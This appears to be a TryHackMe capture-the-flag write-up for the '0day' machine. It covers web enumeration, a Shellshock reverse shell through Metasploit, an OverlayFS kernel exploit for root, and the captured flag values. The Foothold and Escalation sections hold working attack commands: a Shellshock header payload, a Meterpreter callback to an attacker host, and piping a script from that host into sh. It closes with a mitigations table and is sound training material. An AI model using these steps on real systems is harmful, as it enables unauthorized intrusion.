```
 ██████╗ ██████╗  █████╗ ██╗   ██╗
██╔═████╗██╔══██╗██╔══██╗╚██╗ ██╔╝
██║██╔██║██║  ██║███████║ ╚████╔╝
████╔╝██║██║  ██║██╔══██║  ╚██╔╝
╚██████╔╝██████╔╝██║  ██║   ██║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝
      TryHackMe: 0day Machine
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-05 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Medium | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~12 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Escalation](#-escalation)
- [Shell / Access](#-shell--access)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)
- [SEO & Publishing](#-seo--publishing)

---

## Progress Checklist

- [x] Port scan & service enumeration
- [x] Web directory brute force
- [x] Discovered `/backup/` with encrypted SSH private key
- [x] Cracked SSH key passphrase with John the Ripper
- [x] Identified Shellshock via Nikto + CGI endpoint
- [x] Exploited Shellshock for initial shell (www-data)
- [x] Captured user flag
- [x] Ran LinPEAS for privilege escalation candidates
- [x] Exploited CVE-2015-1328 (OverlayFS) for root
- [x] Captured root flag
- [ ] Manual Shellshock (without Metasploit)

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: fast port scanning with service/version detection
- 🕷️ Feroxbuster: recursive web directory brute force
- 🔍 Nikto: web vulnerability scanner
- 🔑 ssh2john + John the Ripper: SSH private key passphrase cracking
- 🐚 Metasploit: Shellshock exploitation (apache_mod_cgi_bash_env_exec)
- 🐍 LinPEAS: automated Linux privilege escalation enumeration
- ⚙️ GCC: compiling the kernel exploit

---

## ⚡ TL;DR

A web server leaking an encrypted SSH private key via an exposed `/backup/` directory, combined with a Shellshock-vulnerable CGI endpoint, gave initial access as `www-data`. From there, an unpatched Ubuntu 14.04 kernel (3.13.x) fell to CVE-2015-1328 (OverlayFS local privilege escalation), handing over root in under a minute of compile time.

---

## 📖 Introduction

Today's victim is a nostalgic little box named **0day**: a name that promises drama and, to its credit, actually delivers. Running an antique Apache version on an equally vintage Ubuntu kernel, it wears its vulnerabilities like badges of honour. The machine greets you with a suspiciously minimal homepage, a suspicious `/backup/` directory that really shouldn't exist, and a CGI endpoint that hasn't heard of Bash's security patches from 2014. It's the kind of target that makes you feel like a time traveler: except the time you're traveling to is a sysadmin's worst nightmare.

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

Starting with RustScan for speed, then handing off to Nmap for the details. Two ports, clean and quiet: exactly the kind of attack surface that makes you look harder at what's there.

*RustScan blasts through all 65535 ports, then passes survivors to Nmap for service fingerprinting:*

```bash
rustscan -a 10.49.181.37 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 6.6.1p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.7 (Ubuntu) |

Two ports. Apache 2.4.7 is ancient (current at the time was 2.4.66+), and the HTTP title comes back as `0day`: same as the machine name. Nothing jumps out from the SSH host keys, so the web server is where the story starts.

### Web Directory Enumeration

*(~5 mins into the box)*

The homepage is minimal: little more than a landing page with a profile image. Time to look behind the curtains.

*Feroxbuster recurses up to 4 levels deep, checking for PHP, text, and HTML files alongside directories:*

```bash
feroxbuster -u http://10.49.181.37/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html
```

```
# output (relevant hits only)
301  http://10.49.181.37/cgi-bin
301  http://10.49.181.37/uploads
301  http://10.49.181.37/admin
301  http://10.49.181.37/backup
200  http://10.49.181.37/robots.txt
200  http://10.49.181.37/backup/index.html   <-- ^^^ this is the important bit
```

`/uploads` and `/admin` both returned blank index pages: dead ends. But `/backup/` had content: a full PEM-encoded RSA private key, passphrase-protected.

```
# /backup/index.html contents
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
...
-----END RSA PRIVATE KEY-----
```

*(truncated: full key saved locally as `id_rsa`)*

### Web Vulnerability Scan

While the key was being processed, Nikto ran in parallel.

*Nikto with `-C all` loads every CGI check available:*

```bash
nikto -h 10.49.181.37 -C all
```

```
# output (relevant findings)
+ Apache/2.4.7 appears to be outdated
+ /backup/: This might be interesting.
+ /secret/: This might be interesting.        # ^^^ worth noting for later
+ /cgi-bin/: present
```

The presence of `/cgi-bin/` on an outdated Apache combined with Bash on Ubuntu 14.04 is a flashing neon sign for one specific vulnerability: **Shellshock (CVE-2014-6271)**.

---

## 🚪 Foothold

*(~10 mins into the box)*

### Shellshock: CVE-2014-6271

**What is Shellshock?** A critical vulnerability in GNU Bash discovered in 2014. Bash allows function definitions to be passed through environment variables: Shellshock occurs because Bash also executes any commands appended *after* the function definition, before it should have any business running them. CGI scripts are particularly dangerous targets because the web server populates HTTP headers directly into environment variables before executing scripts. An attacker can inject a malicious header like `User-Agent: () { :;}; /bin/bash -i` and achieve remote code execution.

The target has `/cgi-bin/test.cgi` exposed (discovered during the Feroxbuster run), which is the trigger point.

*Loading the Metasploit module for Apache mod_cgi Shellshock:*

```bash
msfconsole
```

```
msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf exploit(...) > set RHOST 10.49.181.37
msf exploit(...) > set LHOST 192.168.133.233
msf exploit(...) > set TARGETURI /cgi-bin/test.cgi
msf exploit(...) > exploit
```

```
# output
[*] Started reverse TCP handler on 192.168.133.233:4444
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1062760 bytes) to 10.49.181.37
[*] Meterpreter session 1 opened (192.168.133.233:4444 -> 10.49.181.37:41010)
# ^^^ shell landed
```

---

## 🐚 Shell / Access

*Upgrading from Meterpreter to a proper interactive bash shell:*

```bash
meterpreter > shell
```

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
# output
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We're in as `www-data`: the Apache service account. Limited, but enough to read the user flag and start hunting for escalation paths.

*Grabbing the user flag:*

```bash
cat /home/ryan/user.txt
```

```
THM{Sh3llSh0ck_r0ckz}
```

---

## 📈 Escalation

*(~20 mins into the box)*

### LinPEAS: Kernel CVE Identification

**What is privilege escalation?** As `www-data`, we have very limited permissions. The goal is to find a flaw that lets us execute code as `root`: the system's superuser. Kernel exploits are one avenue: bugs in the OS kernel itself that allow a low-privilege process to elevate its permissions.

*Serving LinPEAS from our attacking machine and piping it directly into sh: no file write needed:*

```bash
curl http://192.168.133.233:80/linpeas.sh | sh
```

LinPEAS returned a long list of CVEs matching the kernel version (`3.13.x`). The most promising candidates:

| CVE | Name | Rank | Notes |
| --- | --- | --- | --- |
| CVE-2015-1328 | overlayfs | 1 | Ubuntu 14.04, practical |
| CVE-2016-5195 | dirtycow | 4 | Reliable but slow/risky |
| CVE-2015-8660 | overlayfs (ovl_setattr) | 1 | Overlaps with above |
| CVE-2014-0038 | timeoutpwn | 1 | Requires CONFIG_X86_X32=y |

**CVE-2015-1328 (OverlayFS)** was selected: it's a clean, reliable local privilege escalation on Ubuntu 14.04/15.04 kernels 3.13.0-3.19.0 that abuses a flaw in how the OverlayFS filesystem handles file permissions. The exploit creates a SUID root shell by leveraging the kernel's failure to validate user namespace permissions in certain overlay mount operations.

### Kernel Exploit: CVE-2015-1328

*Downloading the exploit source from Exploit-DB to the target's /tmp:*

```bash
wget http://192.168.133.233:80/Downloads/37292.c -O /tmp/37292.c
```

*Compiling the C exploit directly on target: GCC is available on this Ubuntu install:*

```bash
gcc /tmp/37292.c -o /tmp/37292
```

*Running the compiled binary:*

```bash
/tmp/37292
```

```
# output
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# ^^^ root shell spawned
```

```bash
id
```

```
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

---

## 💥 Exploitation

Summary of the full exploit chain:

1. **Shellshock (CVE-2014-6271)**: malicious HTTP `User-Agent` header injected via `/cgi-bin/test.cgi`, triggering Bash to execute attacker-controlled commands. Resulted in a reverse shell as `www-data`.
2. **OverlayFS LPE (CVE-2015-1328)**: compiled C exploit abused a kernel permission validation flaw in OverlayFS to write to `/etc/ld.so.preload` and load a malicious shared library, spawning a root shell.

---

## 🐇 Rabbit Holes

### The SSH Private Key from /backup/

Found an encrypted RSA private key at `/backup/index.html`. Converted it for cracking and found the passphrase almost immediately.

*Converting the key for John:*

```bash
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
# output
id_rsa:letmein
```

Tried logging in as `0day` (the homepage name) and `ryan` (found in `/home`):

```bash
ssh 0day@10.49.181.37 -i id_rsa
ssh ryan@10.49.181.37 -i id_rsa
```

Both failed with `sign_and_send_pubkey: no mutual signature supported` followed by password rejection. The server's OpenSSH 6.6.1 and the client's modern OpenSSH disagreed on acceptable signature algorithms, and even with the passphrase, the key simply didn't match any authorized user on this box. *The key was almost certainly left as deliberate misdirection.* Dropped it and moved on to Nikto.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `THM{Sh3llSh0ck_r0ckz}` | `/home/ryan/user.txt` |
| Root | `THM{g00d_j0b_0day_is_Pleased}` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Shellshock (CVE-2014-6271) | Critical | Update Bash to 4.3 patch 25+ and disable or restrict CGI script execution |
| OverlayFS LPE (CVE-2015-1328) | High | Apply kernel patches: Ubuntu Security Notice USN-2610-1 addresses this |
| Exposed `/backup/` directory | High | Never store key material in web-accessible directories; restrict with `.htaccess` or move outside the webroot entirely |
| Outdated Apache (2.4.7) | Medium | Keep web server software patched to current release |
| Missing security headers | Low | Add `Strict-Transport-Security`, `Content-Security-Policy`, and `X-Content-Type-Options` headers to Apache config |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** A `cgi-bin` directory on any server running a pre-2014 Bash is a Shellshock waiting to happen: always pair directory enumeration results with a vulnerability scan, because what looks like a boring CGI endpoint can be your entire foothold.

---

## 🔁 If I Did It Again

Skip Metasploit for the Shellshock step and write the manual `curl` payload instead: it's a one-liner and better for understanding what's actually happening under the hood.

---

## 🔚 Changelog

*Last updated: 2026-06-05*

---

---

[↑ Back to top](#)
